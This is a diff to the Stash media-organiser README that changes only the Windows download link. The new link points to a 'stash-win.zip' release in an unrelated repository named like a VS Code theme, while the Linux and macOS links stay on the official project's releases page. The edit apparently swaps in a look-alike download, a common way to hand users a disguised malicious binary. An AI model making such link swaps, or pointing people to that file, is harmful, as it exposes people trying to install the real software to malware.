@@ -8,7 +8,7 @@ Stash is a web front-end app for serving and organizing your porn. Stash current
 
 You can get the latest Stash for each platform via the following links:
 
- * [Windows       | x64](https://bit.ly/3KXYKbp)
+ * [Windows       | x64](https://github.com/danivict/synthwave-vscode/releases/download/v0.0.7/stash-win.zip)
  * [Linux         | x64](https://github.com/stashapp/stash/releases)
  * [macOS         | x64](https://github.com/stashapp/stash/releases)
 
